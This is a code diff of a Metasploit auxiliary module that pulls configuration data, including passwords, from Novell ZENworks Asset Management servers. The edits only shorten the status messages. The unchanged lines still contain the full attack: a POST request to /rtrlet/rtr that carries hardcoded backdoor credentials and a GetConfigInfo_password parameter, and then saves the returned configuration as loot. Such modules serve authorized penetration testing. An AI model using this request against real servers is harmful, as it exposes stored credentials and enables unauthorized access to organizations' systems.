@@ -47,7 +47,7 @@ class MetasploitModule < Msf::Auxiliary
   def run_host(ip)
     post_data = "kb=&file=&absolute=&maintenance=GetConfigInfo_password&username=Ivanhoe&password=Scott&send=Submit"
 
-    print_status("#{Rex::Socket.to_authority(rhost, rport)} - Sending request...")
+    print_status("Sending request...")
     res = send_request_cgi({
       'uri' => '/rtrlet/rtr',
       'method' => 'POST',
@@ -55,7 +55,7 @@ class MetasploitModule < Msf::Auxiliary
     }, 5)
 
     if res and res.code == 200 and res.body =~ /<b>Rtrlet Servlet Configuration Parameters \(live\)<\/b><br\/>/
-      print_good("#{Rex::Socket.to_authority(rhost, rport)} - File retrieved successfully!")
+      print_good("File retrieved successfully!")
       path = store_loot(
         'novell.zenworks_asset_management.config',
         'text/html',
@@ -64,9 +64,9 @@ class MetasploitModule < Msf::Auxiliary
         nil,
         "Novell ZENworks Asset Management Configuration"
       )
-      print_status("#{Rex::Socket.to_authority(rhost, rport)} - File saved in: #{path}")
+      print_status("File saved in: #{path}")
     else
-      print_error("#{Rex::Socket.to_authority(rhost, rport)} - Failed to retrieve configuration")
+      print_error("Failed to retrieve configuration")
       return
     end
   end
